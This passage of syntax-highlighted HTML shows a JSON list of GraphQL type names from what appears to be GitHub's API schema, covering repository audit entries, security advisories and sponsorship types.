&#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableContributorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableSockpuppetDisallowedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableContributorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableSockpuppetDisallowedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigLockAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigUnlockAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoCreateAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoCreateAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoDestroyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoDestroyAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoRemoveMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoRemoveMemberAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoRemoveTopicAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReportedContentClassifiers&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Repository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryAffiliation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCodeowners&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCodeownersError&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCollaboratorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCollaboratorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryContactLink&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryContributionType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryDiscussionAuthor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryDiscussionCommentAuthor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionAbility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionLimit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionLimitExpiry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionLimitOrigin&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryLockReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigration&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationOrderDirection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryNode&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryTopic&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryTopicConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryTopicEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVisibilityChangeDisableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVisibilityChangeEnableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlert&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlertConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlertEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlertState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestReviewsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestReviewsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestableCheckStatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestedReviewer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequirableByPullRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequiredStatusCheckDescription&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequiredStatusCheckInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RerequestCheckSuiteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RerequestCheckSuitePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ResolveReviewThreadInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ResolveReviewThreadPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowanceActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestRemovedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewStatusHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeEnterpriseOrganizationsMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeEnterpriseOrganizationsMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RoleInOrganization&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SamlDigestAlgorithm&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SamlSignatureAlgorithm&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReply&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SavedReplyOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchResultItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchResultItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchResultItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SearchType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisory&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryEcosystem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryIdentifier&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryIdentifierFilter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryIdentifierType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryPackage&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryPackageVersion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisoryReference&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityAdvisorySeverity&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerability&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SecurityVulnerabilityOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetEnterpriseIdentityProviderInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetEnterpriseIdentityProviderPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetOrganizationInteractionLimitInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetOrganizationInteractionLimitPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetRepositoryInteractionLimitInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetRepositoryInteractionLimitPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetUserInteractionLimitInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SetUserInteractionLimitPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SmimeSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Sponsor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Sponsorable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorableOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivity&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityAction&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsActivityPeriod&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsGoal&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsGoalKind&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsListing&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTier&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierAdminInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorsTierOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Sponsorship&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipNewsletterOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span 